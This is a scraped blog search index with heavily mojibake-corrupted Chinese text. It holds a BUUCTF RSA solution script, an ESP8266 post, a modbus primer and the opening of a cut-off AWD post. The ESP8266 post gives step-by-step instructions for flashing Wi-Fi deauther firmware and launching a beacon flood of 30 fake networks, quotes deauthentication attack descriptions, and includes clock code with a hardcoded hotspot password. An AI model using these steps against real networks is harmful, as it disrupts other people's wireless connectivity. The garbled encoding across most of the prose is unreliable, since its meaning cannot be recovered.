print(m) print(long_to_bytes(m)) [NCTF2019]babyRSA phiä½æ•°é¢„ä¼°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from Crypto.Util.number import * from z3 import * from sympy import * import gmpy2 e = 0x10001 d = 19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913 c = 5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804 p=0 q=0 for k in range(pow(2,15),pow(2,16)): if (e*d-1)%k==0: p=prevprime(gmpy2.iroot((e*d-1)//k,2)[0]) q=nextprime(p) if (p-1)*(q-1)*k==(e*d-1): break n=p*q m=gmpy2.powmod(c,d,n) print(long_to_bytes(m)) ","description":"","id":32,"section":"posts","tags":["CTF","RSA","å¯†ç å­¦"],"title":"BUUCTF RSAç›¸å…³é¢˜ç›®é¢˜è§£","uri":"https://ruokeqx.gitee.io/posts/buuctf-rsa/"},{"content":"èµ·å›  å›½èµ›è€…ï¼ŒylbåŠè€ŒåºŸä¹‹ï¼Œæœ‰äººæ•´æ´»å¦‚ä¸‹ã€‚\nå¬äººè°ˆä¹‹ï¼Œesp8266ä¹Ÿã€‚æ·˜å®æœä¹‹ï¼Œåä½™å…ƒä¹Ÿï¼Œé‚ä¸‹å•ã€‚\nè½¯ä»¶å‡†å¤‡ https://sparks.gogo.co.nz/ch340.htmlä¸‹è½½esp8266é©±åŠ¨CH340\nhttps://github.com/SpacehuhnTech/esp8266_deauther/releasesä¸‹è½½å›ºä»¶Latest releas\nhttps://github.com/nodemcu/nodemcu-flasher/tree/master/Win64/Releaseä¸‹è½½Windowsç‰ˆçƒ§å½•è½¯ä»¶ï¼ˆä¹Ÿå¯ä»¥ç”¨esptool ç›´æ¥pip installå°±è¡Œï¼‰\nhttps://www.arduino.cc/en/Main/Softwareä¸‹è½½arduinoï¼Œè™½ç„¶æˆ‘åˆ·çš„æ—¶å€™æ²¡ç”¨åˆ°QWQ\nçƒ§å½• â‘ æ­¤ç”µè„‘-\u0026gt;ç®¡ç†-\u0026gt;è®¾å¤‡ç®¡ç†å™¨-\u0026gt;ç«¯å£-\u0026gt;æ‰¾åˆ°esp8266çš„ç«¯å£ æˆ‘æ˜¯COM5\nâ‘¡Configé‡Œé½¿è½®æŒ‰é’®é€‰æ‹©ä½ è¦çƒ§å½•çš„ï¼ˆå°±æ˜¯é‚£ä¸ªbinæ–‡ä»¶ï¼‰\nâ‘¢Advancedé‡Œé¢æŠŠæ³¢ç‰¹ç‡æ”¹æˆ9600 ä¸è¿‡åˆ«äººä¸æ”¹ä¹Ÿæ²¡äº‹\nâ‘£ç‚¹å‡»Operationç•Œé¢FlashæŒ‰é’®å°±èƒ½å¼€å§‹çƒ§å½•äº† ç„¶åå°±æ˜¯ä¸‹å›¾çš„æ ·å­ ç­‰å¤§æ¦‚ååˆ†é’Ÿï¼Ÿ\nå¼€å§‹æ•´æ´» çƒ§å½•å¥½äº†æ’æ‹”ä¸€ä¸‹ç”µæºé‡å¯ä¼šæœ‰ä¸€ä¸ªå«â€œpwnedâ€çš„wifiï¼Œå¯†ç æ˜¯\u0026quot;deauther\u0026quot; è¿æ¥ä¸Šåè®¿é—®http://192.168.4.1è¿›å…¥ç®¡ç†ç•Œé¢ã€‚\nSCAN SSIDs Attacks Settingså››ä¸ªé€‰é¡¹ï¼Œå››ä¸ªåŠŸèƒ½æ¨¡å—ã€‚\nSSIDsé‡Œé¢è®¾ç½®è¦Attackçš„å¯¹è±¡å±æ€§ï¼Œä¸‹æ–¹çº¢è‰²å¤§å†™ REMOVE ALLå¯ä»¥ç§»é™¤é¢„è®¾çš„ä¸€äº›ä¸œè¥¿ã€‚ä¸Šæ–¹é…ç½®å‚æ•°å¹¶æ·»åŠ åˆ°ä¸‹æ–¹åˆ—è¡¨ï¼Œæˆ‘æ­¤å¤„æ·»åŠ 30ä¸ªåå«\u0026quot;hacked_by_Qfrost\u0026quot;çš„wifiã€‚\nè¿›å…¥Attacksæ­£å¼æ”»å‡»ï¼Œä¸‰ç§æ¨¡å¼ï¼Œæ‡’å¾—ç¿»è¯‘QWQ\nDeauth\nCloses the connection of WiFi devices by sending deauthentication frames to access points and client devices you selected.\nThis is only possible because a lot of devices don\u0026rsquo;t use the 802.11w-2009 standard that offers a protection against this attack.\nPlease only select one target! When you select multiple targets that run on different channels and start the attack, it will quickly switch between those channels and you have no chance to reconnect to the access point that hosts this web interface.\nBeacon\nBeacon packets are used to advertise access points. By continuously sending beacon packets out, it will look like you created new WiFi networks.\nYou can specify the network names under SSIDs.\nProbe\nProbe requests are sent by client devices to ask if a known network is nearby.\nUse this attack to confuse WiFi trackers by asking for networks that you specified in the SSID list.\nIt\u0026rsquo;s unlikely you will see any impact by this attack with your home network.\næˆ‘è¦æ•´30ä¸ªåŒåwifiå¤ç°ylbsbåœºæ™¯æ‰€ä»¥å°±é€‰Beaconï¼Œç‚¹å‡»Beaconå³ä¾§ START å°±å¯ä»¥æ— è„‘å¼€å§‹äº†ã€‚\næœ€åç»™å¤§å®¶åº·åº·æ•´çš„æ´»\nåç»­ è€å¸ˆæœ‰ä¸ªæ–°è‹—é¡¹ç›®ï¼Œè®©æˆ‘æç¡¬ä»¶ã€‚äºæ˜¯æƒ³å†æ¥ç©ç©è¿™esp8266ã€‚\nç½‘ç»œæ—¶é’Ÿ é¡¹ç›®æ˜¯è¿™ä¸ªï¼šhttps://github.com/flyAkari/ESP8266_Network_Clock\nå­¦ä¹ è¿æ¥ï¼š\nåŸºäºssd1306é©±åŠ¨çš„12864oledå±ä»‹ç»\nESP8266è¿æ¥OLEDæ˜¾ç¤ºå±å¹¶æ˜¾ç¤ºä½å›¾å›¾åƒ\nu8g2åº“\nä»–æœ‰ç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå…ˆæ‹¿è¿™ä¸ªupçš„æ•´ä¸€æ³¢ã€‚\nç»™esp8266å’ŒOLEDå±æ¥çº¿ï¼Œå¦‚ä¸‹è¡¨\u0026amp;å›¾ã€‚\nOLEDå±æ¥å£ ESP8266æ¥å£ GND Gï¼ˆå°±æ˜¯GNDï¼‰ VCC 3Vï¼ˆä¸€èˆ¬æ¨èæ˜¯æ¥5Vï¼Œä½†æ˜¯è¿™ä¸ªæ¿å­åªæœ‰3Vï¼‰ SCL D1ï¼ˆGPIO5ï¼‰ SDA D2ï¼ˆGPIO4ï¼‰ ä¸‹é¢è¿™å¥æ˜¯Arduinoçš„ä¸€ä¸ªå±å¹•é©±åŠ¨åº“u8g2 çš„wikié‡Œå…³äºè¿™ä¸ªå±å¹•çš„ä¸€å¥ä»‹ç»ã€‚ I2C, IIC or TWI: Inter-Integrated Circuit Bus which has two signals: Clock (SCL) and Data (SDA).\nè¿æ¥å¥½åå°±å¯ä»¥çƒ§å½•äºŒè¿›åˆ¶æ–‡ä»¶è¿›æ¿å­äº†ï¼Œçƒ§å½•è¯¦æƒ…è§å¦ä¸€ä¸ªåšå®¢ã€‚çƒ§å½•å¥½äº†æŒ‰ä¸€ä¸‹æ¿å­ä¸Šçš„RSTæŒ‰é”®å°±å¯åŠ¨äº†ã€‚\nè¿æ¥äº†åˆ›é”®çš„æ— å¯†ç wifiåè¿›å…¥192.168.4.1å°±å¯ä»¥ä¿®æ”¹é…ç½®ç„¶åè®©æ¿å­è¿ä¸Šæˆ‘ä»¬è‡ªå·±çš„wifiç„¶åè”ç½‘åŒæ­¥æ—¶é—´ã€‚(æ²¡é”™ä¸Šé¢çš„å°±æ˜¯æˆ‘çš„çƒ­ç‚¹å¯†ç ï¼Œæ¬¢è¿æ¥è¿.jpg)\nè¿å¥½wifiåä¸ä¹…å°±å¯ä»¥çœ‹åˆ°æ—¶é—´åŒæ­¥äº†ï¼Œç¬¬ä¸€æ¬¡æ•´è¿˜æŒºæœ‰æ„æ€çš„ã€‚\nä»£ç å¦‚ä¸‹ï¼Œç¨å¾®ä¿®æ”¹ä¸€ä¸‹å°±å‡è£…å¯ä»¥æ˜¯è‡ªå·±çš„ã€‚åç»­è‡ªå·±ç ”ç©¶ä¸€ä¸‹å†™ä¸€ä¸ª(å’•å’•å’•)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 /* ä½œè€…ï¼šflyAkari ä¼šé£çš„é˜¿å¡æ— bilibili UID:751219 * æœ¬ä»£ç é€‚ç”¨äºESP8266 NodeMCU + 12864æ˜¾ç¤ºå± * 7pin SPIå¼•è„šï¼Œæ­£é¢çœ‹ï¼Œä»å·¦åˆ°å³ä¾æ¬¡ä¸ºGNDã€VCCã€D0ã€D1ã€RESã€DCã€CS * ESP8266 --- OLED * 3V --- VCC * G --- GND * D7 --- D1 * D5 --- D0 * D2orD8--- CS * D1 --- DC * RST --- RES * 4pin IICå¼•è„šï¼Œæ­£é¢çœ‹ï¼Œä»å·¦åˆ°å³ä¾æ¬¡ä¸ºGNDã€VCCã€SCLã€SDA * ESP8266 --- OLED * 3.3V --- VCC * G (GND) --- GND * D1(GPIO5)--- SCL * D2(GPIO4)--- SDA */ #include \u0026lt;TimeLib.h\u0026gt; #include \u0026lt;ESP8266WiFi.h\u0026gt; #include \u0026lt;WiFiUdp.h\u0026gt; #include \u0026lt;SPI.h\u0026gt; #include \u0026lt;DYWiFiConfig.h\u0026gt; #include \u0026lt;U8g2lib.h\u0026gt; //è‹¥å±å¹•ä½¿ç”¨SH1106ï¼Œåªéœ€æŠŠSSD1306æ”¹ä¸ºSH1106å³å¯ //U8G2_SSD1306_128X64_NONAME_F_4W_HW_SPI u8g2(U8G2_R0, /* cs=*/4, /* dc=*/5, /* reset=*/3); U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, /* reset=*/ U8X8_PIN_NONE); //U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, /* reset=*/ U8X8_PIN_NONE, /* clock=*/ 4, /* data=*/ 5); //D-duino DYWiFiConfig wificonfig; ESP8266WebServer webserver(80); //#define DEF_WIFI_SSID \u0026#34;D1\u0026#34; //#define DEF_WIWI_PASSWORD \u0026#34;01234567890\u0026#34; #define DEF_WIFI_SSID \u0026#34;ruokeqx\u0026#39;s phone\u0026#34; #define DEF_WIWI_PASSWORD \u0026#34;1234qwer\u0026#34; #define AP_NAME \u0026#34;ruokeqx\u0026#34; //dev void wificb(int c) { Serial.print(\u0026#34;=-=-=-=-\u0026#34;); Serial.println(c); } static const char ntpServerName[] = \u0026#34;ntp1.aliyun.com\u0026#34;; //NTPæœåŠ¡å™¨ï¼Œé˜¿é‡Œäº‘ const int timeZone = 8; //æ—¶åŒºï¼ŒåŒ—äº¬æ—¶é—´ä¸º+8 WiFiUDP Udp; unsigned int localPort = 8888; // ç”¨äºä¾¦å¬UDPæ•°æ®åŒ…çš„æœ¬åœ°ç«¯å£ time_t getNtpTime(); void sendNTPpacket(IPAddress\u0026amp; address); void oledClockDisplay(); void sendCommand(int command, int value); void initdisplay(); boolean isNTPConnected = false; const unsigned char xing[] U8X8_PROGMEM = { 0x00, 0x00, 0xF8, 0x0F, 0x08, 0x08, 0xF8, 0x0F, 0x08, 0x08, 0xF8, 0x0F, 0x80, 0x00, 0x88, 0x00, 0xF8, 0x1F, 0x84, 0x00, 0x82, 0x00, 0xF8, 0x0F, 0x80, 0x00, 0x80, 0x00, 0xFE, 0x3F, 0x00, 0x00 }; /*æ˜Ÿ*/ const unsigned char liu[] U8X8_PROGMEM = { 0x40, 0x00, 0x80, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0xFF, 0x7F, 0x00, 0x00, 0x00, 0x00, 0x20, 0x02, 0x20, 0x04, 0x10, 0x08, 0x10, 0x10, 0x08, 0x10, 0x04, 0x20, 0x02, 0x20, 0x00, 0x00 }; /*å…­*/ void setup() { Serial.begin(115200); while (!Serial) continue; Serial.println(\u0026#34;NTP Clock oled version v1.1\u0026#34;); Serial.println(\u0026#34;Designed by flyAkari\u0026#34;); initdisplay(); u8g2.clearBuffer(); u8g2.setFont(u8g2_font_unifont_t_chinese2); u8g2.setCursor(0, 14); u8g2.print(\u0026#34;Waiting for WiFi\u0026#34;); u8g2.setCursor(0, 30); u8g2.print(\u0026#34;connection...\u0026#34;); u8g2.setCursor(0, 47); u8g2.print(\u0026#34;flyAkari\u0026#34;); u8g2.setCursor(0, 64); u8g2.print(\u0026#34;192.168.4.1\u0026#34;); u8g2.sendBuffer(); Serial.println(\u0026#34;OLED Ready\u0026#34;); Serial.print(\u0026#34;Connecting WiFi...\u0026#34;); wificonfig.begin(\u0026amp;webserver, \u0026#34;/\u0026#34;); DYWIFICONFIG_STRUCT defaultConfig = wificonfig.createConfig(); strcpy(defaultConfig.SSID, DEF_WIFI_SSID); strcpy(defaultConfig.SSID_PASSWORD, DEF_WIWI_PASSWORD); strcpy(defaultConfig.HOSTNAME, AP_NAME); strcpy(defaultConfig.APNAME, AP_NAME); wificonfig.setDefaultConfig(defaultConfig); wificonfig.enableAP(); while (WiFi.status() != WL_CONNECTED) { wificonfig.handle(); //è‹¥ä¸éœ€è¦Webåå°ï¼Œå¯ä»¥æ³¨é‡Šæ‰æ­¤è¡Œ //Serial.println(\u0026#34;Waiting for Connection...\u0026#34;); } Serial.println(\u0026#34;\u0026#34;); Serial.println(\u0026#34;WiFi connected\u0026#34;); Serial.println(\u0026#34;IP address: \u0026#34;); Serial.println(WiFi.localIP()); Serial.println(\u0026#34;Starting UDP\u0026#34;); Udp.begin(localPort); Serial.print(\u0026#34;Local port: \u0026#34;); Serial.println(Udp.localPort()); Serial.println(\u0026#34;waiting for sync\u0026#34;); setSyncProvider(getNtpTime); setSyncInterval(30); //æ¯300ç§’åŒæ­¥ä¸€æ¬¡æ—¶é—´ isNTPConnected = true; } time_t prevDisplay = 0; //å½“æ—¶é’Ÿå·²ç»æ˜¾ç¤º void loop() { if (timeStatus() != timeNotSet) { if (now() != prevDisplay) { //æ—¶é—´æ”¹å˜æ—¶æ›´æ–°æ˜¾ç¤º prevDisplay = now(); oledClockDisplay(); } } wificonfig.handle(); //è‹¥ä¸éœ€è¦Webåå°ï¼Œå¯ä»¥æ³¨é‡Šæ‰æ­¤è¡Œ } void initdisplay() { u8g2.begin(); u8g2.enableUTF8Print(); } void oledClockDisplay() { int years, months, days, hours, minutes, seconds, weekdays; years = year(); months = month(); days = day(); hours = hour(); minutes = minute(); seconds = second(); weekdays = weekday(); Serial.printf(\u0026#34;%d/%d/%d %d:%d:%d Weekday:%d\\n\u0026#34;, years, months, days, hours, minutes, seconds, weekdays); u8g2.clearBuffer(); u8g2.setFont(u8g2_font_unifont_t_chinese2); u8g2.setCursor(0, 14); if (isNTPConnected) u8g2.print(\u0026#34;å½“å‰æ—¶é—´ (UTC+8)\u0026#34;); else u8g2.print(\u0026#34;æ— ç½‘ç»œ!\u0026#34;); //å¦‚æœä¸Šæ¬¡å¯¹æ—¶å¤±è´¥ï¼Œåˆ™ä¼šæ˜¾ç¤ºæ— ç½‘ç»œ String currentTime = \u0026#34;\u0026#34;; if (hours \u0026lt; 10) currentTime += 0; currentTime += hours; currentTime += \u0026#34;:\u0026#34;; if (minutes \u0026lt; 10) currentTime += 0; currentTime += minutes; currentTime += \u0026#34;:\u0026#34;; if (seconds \u0026lt; 10) currentTime += 0; currentTime += seconds; String currentDay = \u0026#34;\u0026#34;; currentDay += years; currentDay += \u0026#34;/\u0026#34;; if (months \u0026lt; 10) currentDay += 0; currentDay += months; currentDay += \u0026#34;/\u0026#34;; if (days \u0026lt; 10) currentDay += 0; currentDay += days; u8g2.setFont(u8g2_font_logisoso24_tr); u8g2.setCursor(0, 44); u8g2.print(currentTime); u8g2.setCursor(0, 61); u8g2.setFont(u8g2_font_unifont_t_chinese2); u8g2.print(currentDay); u8g2.drawXBM(80, 48, 16, 16, xing); u8g2.setCursor(95, 62); u8g2.print(\u0026#34;æœŸ\u0026#34;); if (weekdays == 1) u8g2.print(\u0026#34;æ—¥\u0026#34;); else if (weekdays == 2) u8g2.print(\u0026#34;ä¸€\u0026#34;); else if (weekdays == 3) u8g2.print(\u0026#34;äºŒ\u0026#34;); else if (weekdays == 4) u8g2.print(\u0026#34;ä¸‰\u0026#34;); else if (weekdays == 5) u8g2.print(\u0026#34;å››\u0026#34;); else if (weekdays == 6) u8g2.print(\u0026#34;äº”\u0026#34;); else if (weekdays == 7) u8g2.drawXBM(111, 49, 16, 16, liu); u8g2.sendBuffer(); } /*-------- NTP ä»£ç  ----------*/ const int NTP_PACKET_SIZE = 48; // NTPæ—¶é—´åœ¨æ¶ˆæ¯çš„å‰48ä¸ªå­—èŠ‚é‡Œ byte packetBuffer[NTP_PACKET_SIZE]; // è¾“å…¥è¾“å‡ºåŒ…çš„ç¼“å†²åŒº time_t getNtpTime() { IPAddress ntpServerIP; // NTPæœåŠ¡å™¨çš„åœ°å€ while (Udp.parsePacket() \u0026gt; 0); // ä¸¢å¼ƒä»¥å‰æ¥æ”¶çš„ä»»ä½•æ•°æ®åŒ… Serial.println(\u0026#34;Transmit NTP Request\u0026#34;); // ä»æ± ä¸­è·å–éšæœºæœåŠ¡å™¨ WiFi.hostByName(ntpServerName, ntpServerIP); Serial.print(ntpServerName); Serial.print(\u0026#34;: \u0026#34;); Serial.println(ntpServerIP); sendNTPpacket(ntpServerIP); uint32_t beginWait = millis(); while (millis() - beginWait \u0026lt; 1500) { int size = Udp.parsePacket(); if (size \u0026gt;= NTP_PACKET_SIZE) { Serial.println(\u0026#34;Receive NTP Response\u0026#34;); isNTPConnected = true; Udp.read(packetBuffer, NTP_PACKET_SIZE); // å°†æ•°æ®åŒ…è¯»å–åˆ°ç¼“å†²åŒº unsigned long secsSince1900; // å°†ä»ä½ç½®40å¼€å§‹çš„å››ä¸ªå­—èŠ‚è½¬æ¢ä¸ºé•¿æ•´å‹ï¼Œåªå–å‰32ä½æ•´æ•°éƒ¨åˆ† secsSince1900 = (unsigned long)packetBuffer[40] \u0026lt;\u0026lt; 24; secsSince1900 |= (unsigned long)packetBuffer[41] \u0026lt;\u0026lt; 16; secsSince1900 |= (unsigned long)packetBuffer[42] \u0026lt;\u0026lt; 8; secsSince1900 |= (unsigned long)packetBuffer[43]; Serial.println(secsSince1900); Serial.println(secsSince1900 - 2208988800UL + timeZone * SECS_PER_HOUR); return secsSince1900 - 2208988800UL + timeZone * SECS_PER_HOUR; } } Serial.println(\u0026#34;No NTP Response :-(\u0026#34;); //æ— NTPå“åº” isNTPConnected = false; return 0; //å¦‚æœæœªå¾—åˆ°æ—¶é—´åˆ™è¿”å›0 } // å‘ç»™å®šåœ°å€çš„æ—¶é—´æœåŠ¡å™¨å‘é€NTPè¯·æ±‚ void sendNTPpacket(IPAddress\u0026amp; address) { memset(packetBuffer, 0, NTP_PACKET_SIZE); packetBuffer[0] = 0b11100011; // LI, Version, Mode packetBuffer[1] = 0; // Stratum, or type of clock packetBuffer[2] = 6; // Polling Interval packetBuffer[3] = 0xEC; // Peer Clock Precision // 8 bytes of zero for Root Delay \u0026amp; Root Dispersion packetBuffer[12] = 49; packetBuffer[13] = 0x4E; packetBuffer[14] = 49; packetBuffer[15] = 52; Udp.beginPacket(address, 123); //NTPéœ€è¦ä½¿ç”¨çš„UDPç«¯å£å·ä¸º123 Udp.write(packetBuffer, NTP_PACKET_SIZE); Udp.endPacket(); } ","description":"","id":33,"section":"posts","tags":["åµŒå…¥å¼","esp8266"],"title":"esp8266æ•´ç‚¹æ´»","uri":"https://ruokeqx.gitee.io/posts/esp8266%E6%95%B4%E7%82%B9%E6%B4%BB/"},{"content":"å›½èµ›å†³èµ›çš„modbusæµé‡è‡³ä»Šæ²¡æ¥å‡ºæ¥ï¼Œå­¦ä¹ ä¸€ä¸‹é€šä¿¡åŸºç¡€ï¼Œçˆ¬çˆ¬çˆ¬ã€‚\næ•°å­—é€šä¿¡æ–¹å¼ æŒ‰ä¼ é€æ–¹å¼åˆ†ç±» å¹¶è¡Œ æŒ‰å­—æˆ–å­—èŠ‚ä¸ºå•ä½ä¼ è¾“ï¼Œnä½å¿…é¡»è¦næ ¹çº¿ï¼Œä¼ è¾“é€Ÿåº¦å¿«ï¼Œé€šä¿¡çº¿å¤šï¼Œæˆæœ¬é«˜ã€‚å¤šç”¨äºè®¡ç®—æœºå’ŒPLCå†…éƒ¨æ€»çº¿ï¼Œå¦‚æ˜¾å¡æ•°æ®ã€‚ ä¸²è¡Œ ä»¥bitä¸ºå•ä½ï¼Œæ¯æ¬¡ä¼ 1bitï¼Œä¼ è¾“è·ç¦»è¿œã€‚ æŒ‰ä¼ é€æ–¹å‘åˆ†ç±» å•å·¥ ä¸€æ–¹åªèƒ½æ¥æ”¶ä¸èƒ½å‘å‡ºï¼šæ‰“å°æœº åŠåŒå·¥ ä¸€æ ¹çº¿ä¼ è¾“ï¼ŒåŒæ—¶åªæœ‰ä¸€æ–¹å‘å‡ºï¼šå¯¹è®²æœº åŒå·¥ ä¸¤æ ¹çº¿ä¼ è¾“ï¼ŒåŒæ–¹å¯åŒæ—¶å‘å‡º æŒ‰é€šä¿¡ä»‹è´¨åˆ†ç±» åŒç»çº¿ åŒè½´ç”µç¼† å…‰çº¤ é€šä¿¡åè®®ä¸‰è¦ç´  é€šä¿¡æ¥å£æ ‡å‡† é€šä¿¡æ¥å£æ ‡å‡†æ˜¯é€šä¿¡çš„ç¡¬ä»¶åè®®ï¼Œæä¾›äº†æœºæ¢°çš„ç”µæ°”çš„åŠŸèƒ½æ€§çš„ç‰¹æ€§å’Œè§„ç¨‹ã€‚\nä¸²è¡Œæ•°æ®æ¥å£æ ‡å‡†ï¼Œæœ€å¸¸è§çš„æ˜¯RS232ã€RS422ã€RS485ä¸²è¡Œæ¥å£æ ‡å‡†\né€šä¿¡æ ¼å¼ ç©¿è¡Œå¼‚æ­¥é€šä¿¡ä¸­ï¼Œé€šä¿¡åŒæ–¹å¿…é¡»å°±é€šä¿¡æ•°æ®ä¼ é€æ–¹å¼ï¼Œä¼ é€çš„æ•°æ®é•¿åº¦ï¼Œæ ¡éªŒæ–¹å¼å’Œä¼ è¾“é€Ÿç‡è¿›è¡Œç»Ÿä¸€è®¾ç½®ï¼Œè¿™æ ·æ‰èƒ½ä¿è¯åŒæ–¹é€šä¿¡çš„æ­£ç¡®ã€‚è¿™ç§åŒæ–¹ç»Ÿä¸€è®¾ç½®çš„å‚æ•°ï¼Œç§°ä¹‹ä¸ºé€šä¿¡æ ¼å¼ã€‚\né€šä¿¡æ•°æ®æ ¼å¼ ä¿¡æ¯ä¼ è¾“å†…å®¹åšå‡ºè§„å®šï¼Œå¦‚ä¿¡æ¯å¸§çš„ç»“æ„ï¼Œè®¾å¤‡çš„ç«™å€ï¼ŒåŠŸèƒ½ä»£ç ï¼Œå‘é€çš„æ•°æ®æ ¡éªŒæ–¹å¼ï¼Œé”™è¯¯æ£€æµ‹ã€‚\né€šä¿¡æ¥å£æ ‡å‡† RS232 RS485 é¦–é€‰çš„ä¸²è¡Œæ¥å£ã€‚\nRS485æ¥å£ç»„æˆçš„åŠåŒå·¥ç½‘ç»œï¼Œä¸€èˆ¬åªéœ€äºŒæ ¹è¿çº¿ï¼Œæˆæœ¬ä½ï¼Œæ˜“å®ç°ã€‚å†åˆ†å¸ƒå¼å·¥ä¸šæ§åˆ¶ç³»ç»Ÿç§å¹¿æ³›åº”ç”¨ã€‚\nç»ˆç«¯ç”µé˜»\n100æ¬§\næœ«ç«¯\né€šä¿¡æ ¼å¼ä¸æ•°æ®æ ¼å¼ ä¸²è¡Œå¼‚æ­¥é€šä¿¡ä¼ é€ å¦‚ä½•çŸ¥é“å¼€å§‹ä¼ é€ ç»“æŸä¼ é€ å‘é€çš„å­—ç¬¦ä½æ•° å¦‚ä½•çŸ¥é“æ¥å—çš„å­—ç¬¦æ²¡é”™ modbusåè®® åŸºäºRS485ï¼Œä¸»ä»å¼çš„ä¸²è¡Œå¼‚æ­¥åŠåŒå·¥é€šä¿¡åè®®ã€‚\nasciiæ¨¡å¼ æ•°æ® ä½æ•° èµ·å§‹ä½ï¼š 1ä½ æ•°æ®é•¿åº¦ï¼š 7ä½ï¼Œä½ä½å…ˆ æ ¡éªŒä½ï¼š 1ï¼ˆæœ‰æ ¡éªŒï¼‰ï¼Œ0ï¼ˆæ— ï¼‰ åœæ­¢ä½ï¼š 1ï¼ˆæœ‰æ ¡éªŒï¼‰ï¼Œ2ï¼ˆæ— ï¼‰ æ³¢ç‰¹ç‡ï¼š å¯é€‰ èµ·å§‹ç  åœ°å€ç  åŠŸèƒ½ç  æ•°æ®åŒº æ ¡éªŒç  åœæ­¢ç  : 01-1F åŠŸèƒ½ç  nä¸ªå­—ç¬¦ LRC CR | LF : 01 03 21 02 00 02 LRC CR | LF LRCæ ¡éªŒç ï¼šä»åœ°å€ç åˆ°æ•°æ®åŒºçš„2ä½HEXæ±‚å’Œï¼Œå–å’Œçš„ä½8ä½çš„è¡¥ç ä¸ºLRCæ ¡éªŒç ã€‚\nRTUæ¨¡å¼ æ•°æ® ä½æ•° èµ·å§‹ä½ï¼š 1ä½ æ•°æ®é•¿åº¦ï¼š 8ä½ï¼Œä½ä½å…ˆ æ ¡éªŒä½ï¼š 1ï¼ˆæœ‰æ ¡éªŒï¼‰ï¼Œ0ï¼ˆæ— ï¼‰ åœæ­¢ä½ï¼š 1ï¼ˆæœ‰æ ¡éªŒï¼‰ï¼Œ2ï¼ˆæ— ï¼‰ æ³¢ç‰¹ç‡ï¼š å¯é€‰ èµ·å§‹ç  åœ°å€ç  åŠŸèƒ½ç  æ•°æ®åŒº æ ¡éªŒç  åœæ­¢ç  3.5å­—ç¬¦åœæ­¢æ—¶é—´ 01-1F åŠŸèƒ½ç  nä¸ªå­—ç¬¦ CRC 3.5å­—ç¬¦åœæ­¢æ—¶é—´ 3.5å­—ç¬¦åœæ­¢æ—¶é—´ 01 03 21 02 00 02 CRC 3.5å­—ç¬¦åœæ­¢æ—¶é—´ 3.5å­—ç¬¦åœæ­¢æ—¶é—´ 01 83 é”™è¯¯ä»£ç  CRC 3.5å­—ç¬¦åœæ­¢æ—¶é—´ å‘é€å¸§ä¿¡æ¯æœŸé—´ï¼Œå‡ºç°å¤§äº1.5ä¸ªå­—ç¬¦çš„\té™æ­¢æ—¶é—´ï¼Œåˆ™ä¿¡æ¯ä¼šå‡ºç°é”™è¯¯ã€‚\né”™è¯¯åº”ç­” åŠŸèƒ½ç  æ­£ç¡®åº”ç­” é”™è¯¯åº”ç­” H03(0000 0011) H03 H83(1000 0011) H06 H06 H86 H10 H10 H90 ","description":"","id":34,"section":"posts","tags":["é€šä¿¡"],"title":"é€šä¿¡å…¥é—¨ä»¥modbusé€šä¿¡åè®®ä¸ºä¾‹","uri":"https://ruokeqx.gitee.io/posts/%E9%80%9A%E4%BF%A1%E5%85%A5%E9%97%A8%E4%BB%A5modbus%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE%E4%B8%BA%E4%BE%8B/"},{"content":"æˆ‘æ˜¯æ‡’ç‹—æ— ç–‘äº† ä¸€ä¸ªåšå®¢éƒ½èƒ½æ‰˜ä¸¤å¤©ä¸åš\næ€ä¹ˆè¯´å‘¢ï¼Œäººç”Ÿç¬¬ä¸€æ¬¡AWDæ¥çš„æœ‰ç‚¹çªç„¶ ã€‚åˆšå¥½åœ¨çœ‹æ‰‹æœºï¼Œè§‚èŠ±å§å§åœ¨ç¾¤é‡Œè¯´äº†å£°AWDæŠ¥åï¼Œæˆ‘å°±æŠ±ç€è¯•è¯•çœ‹çš„æ€åº¦å°±å‚åŠ äº†ã€‚\nã€Šæœ¬ç¯‡åšå®¢çº¯å±æƒ³åˆ°å•¥è¯´å•¥ã€‹\nèµ›å‰ 